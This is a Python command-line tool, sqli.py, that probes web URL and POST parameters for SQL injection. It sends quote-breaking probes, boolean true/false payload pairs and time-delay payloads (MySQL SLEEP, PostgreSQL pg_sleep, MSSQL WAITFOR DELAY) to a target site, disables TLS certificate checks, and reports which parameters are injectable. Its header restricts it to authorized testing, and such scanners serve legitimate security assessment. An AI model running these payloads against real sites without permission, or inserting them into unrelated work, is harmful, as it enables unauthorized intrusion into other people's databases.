#!/usr/bin/env python3
"""sqli.py — test URL parameters for SQL injection (error / boolean-blind / time-blind).

Authorized testing only: your own apps, in-scope bug bounty targets, or engagements
with written permission. You are responsible for how you use it.

usage:
  ./sqli.py "https://site/item?id=1&cat=books"
  ./sqli.py "https://site/login" -d "user=admin&pass=x"
"""
import sys, re, time, argparse, urllib.parse as up, urllib.request as ur, ssl

# DBMS error signatures -> error-based injection is confirmed if one appears
ERRORS = re.compile(r"|".join([
    r"SQL syntax.*MySQL", r"MySQLSyntaxError", r"valid MySQL result", r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PG::SyntaxError",
    r"Microsoft SQL (Server|Native)", r"ODBC SQL Server Driver", r"Unclosed quotation mark",
    r"SQLite/JDBCDriver", r"SQLite\.Exception", r"sqlite3.OperationalError", r"unrecognized token",
    r"ORA-\d{5}", r"Oracle error",
]), re.I)

PAIRS = [  # (true-payload, false-payload) appended to the original value, for boolean-blind
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),
]
TIME = [  # sleep payloads per DBMS; {s} = seconds
    "' AND SLEEP({s})-- -", '" AND SLEEP({s})-- -', " AND SLEEP({s})-- -",          # MySQL
    "'; SELECT pg_sleep({s})-- -", " AND (SELECT {n} FROM pg_sleep({s}))-- -",       # PostgreSQL
    "'; WAITFOR DELAY '0:0:{s}'-- -", " WAITFOR DELAY '0:0:{s}'-- -",                 # MSSQL
]
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE


def fetch(url, data=None, timeout=20):
    """Return (body, seconds). data=dict -> POST form. Errors become ('', elapsed)."""
    body = up.urlencode(data).encode() if data else None
    req = ur.Request(url, data=body, headers={"User-Agent": "sqli.py"})
    t = time.monotonic()
    try:
        with ur.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.read().decode("utf-8", "replace"), time.monotonic() - t
    except Exception as e:
        got = getattr(e, "read", lambda: b"")()  # HTTPError still carries a body
        return got.decode("utf-8", "replace"), time.monotonic() - t


def mutate(params, key, value):
    p = dict(params); p[key] = value; return p


def test_param(target, params, key, post):
    """Yield one finding string per confirmed class for this parameter."""
    orig = params[key]
    send = (lambda p: fetch(target, p)) if post else (lambda p: fetch(target + "?" + up.urlencode(p)))

    # error-based: break the query, look for a DBMS error that the clean value doesn't produce
    base_body, _ = send(params)
    for probe in ("'", '"', "')"):
        body, _ = send(mutate(params, key, orig + probe))
        if ERRORS.search(body) and not ERRORS.search(base_body):
            yield f"error-based  ({probe!r} triggers DBMS error)"; break

    # boolean-blind: true-payload page should match the clean page; false-payload should differ
    for t_pl, f_pl in PAIRS:
        bt, _ = send(mutate(params, key, orig + t_pl))
        bf, _ = send(mutate(params, key, orig + f_pl))
        if bt and len(bt) != len(bf) and abs(len(bt) - len(base_body)) < abs(len(bf) - len(base_body)):
            yield f"boolean-blind ({t_pl!r} vs {f_pl!r}: {len(bt)} vs {len(bf)} bytes)"; break

    # time-blind: a sleep payload should delay the response ~DELAY sec; confirm with a re-test
    DELAY = 5
    for tpl in TIME:
        _, dt = send(mutate(params, key, orig + tpl.format(s=DELAY, n=1)))
        if dt >= DELAY - 1:  # re-test to rule out a slow network blip
            _, dt2 = send(mutate(params, key, orig + tpl.format(s=DELAY, n=1)))
            if dt2 >= DELAY - 1:
                yield f"time-blind   ({tpl.split(chr(39))[0] or tpl[:20]!r}: {dt:.1f}s/{dt2:.1f}s)"; break


def main():
    ap = argparse.ArgumentParser(description="SQL injection parameter tester (authorized use only)")
    ap.add_argument("url", help="target URL; include query params for GET")
    ap.add_argument("-d", "--data", help="POST form data, e.g. 'user=a&pass=b'")
    a = ap.parse_args()

    if a.data:
        params = dict(up.parse_qsl(a.data, keep_blank_values=True)); target = a.url; post = True
    else:
        u = up.urlsplit(a.url)
        params = dict(up.parse_qsl(u.query, keep_blank_values=True))
        target = up.urlunsplit((u.scheme, u.netloc, u.path, "", "")); post = False

    if not params:
        sys.exit("no parameters found — add ?a=1&b=2 to the URL or pass -d 'a=1&b=2'")

    print(f"[*] {'POST' if post else 'GET'} {target} — {len(params)} param(s): {', '.join(params)}\n")
    hits = 0
    for key in params:
        print(f"[>] {key}")
        for f in test_param(target, params, key, post):
            print(f"    [!] {f}"); hits += 1
    print(f"\n[*] done — {hits} finding(s)")


if __name__ == "__main__":
    main()
